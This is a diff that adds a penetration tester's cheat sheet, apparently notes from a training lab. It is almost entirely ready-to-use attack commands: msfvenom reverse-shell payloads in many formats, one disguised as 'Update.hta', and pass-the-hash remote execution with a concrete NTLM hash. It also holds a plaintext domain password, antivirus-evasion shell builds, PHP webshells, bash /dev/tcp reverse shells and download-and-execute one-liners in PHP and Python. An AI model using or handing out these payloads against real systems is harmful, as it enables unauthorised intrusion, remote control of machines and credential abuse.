@@ -1,0 +1,50 @@
+# Notes
+- Make sure shell works for architecture (linux vs windows, x86 vs x64)
+- If not getting a callback, check if port is blocked (try 80, 443 or any open port on target)
+
+# MSFVenom
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.206 LPORT=4444 -f jsp -o shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.168 LPORT=4444 -o shell.jsp
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.206 -b '\x00\x0d\x0a' LPORT=4446 -f python -v shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.206 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.206 LPORT=4444 -f c -v shellcode
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.206 LPORT=80 -f elf -o shell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.219 LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.219 LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f hta-psh -o Update.hta
+# javascript shell
+# 10.11.1.237 HUMBLE
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f js_le
+
+
+# Windows
+pth-winexe -U offsec%{32 chars}:{32 chars} //10.11.1.123 cmd		# pg 657
+wmiexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:3fee04b01f59a1001a366a7681e95699" administrator@<ip>
+	* aad3b435b51404eeaad3b435b51404ee is the common empty LM hash *
+atexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:3fee04b01f59a1001a366a7681e95699" administrator@<ip>
+psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:3fee04b01f59a1001a366a7681e95699" administrator@<ip>
+smbexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:3fee04b01f59a1001a366a7681e95699" administrator@<ip>
+psexec.py xor.com/daisy:XorPasswordIsDead17@<ip>
+psexec.exe -accepteula -u <username> -p <password> <executable>
+
+# AV shells
+# meanandlean.c, custom windows reverse shell shell
+i686-w64-mingw32-gcc meanandlean.c -o meanandlean -lws2_32
+# antivirus_shell.cpp, wrapper that will execute windows shellcode
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.200 LPORT=443 -f c -b \x00\x0a\x0d
+x86_64-w64-mingw32-gcc antivirus_shell.cpp -o mys.exe
+
+# PHP
+<?php echo "<pre>";echo shell_exec($_REQUEST["c"]);echo "</pre>";?>		# webshell
+<?php shell_exec("bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1");?>		# Linux
+<?php system("bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1");?>		# Linux
+<?php $data = file_get_contents( "http://192.168.119.233/shell.exe" );file_put_contents( "shell.exe", $data );system( "shell.exe");?>		# Windows
+
+# python
+import os;os.system('wget -P /tmp http://192.168.119.206:8080/juju.elf && chmod +x /tmp/juju.elf && /tmp/juju.elf &')
+python -c "import binascii;print('0x'+binascii.hexlify(open('shell.php','rb').read()).decode())"	# encoded
+
+
+
+
+
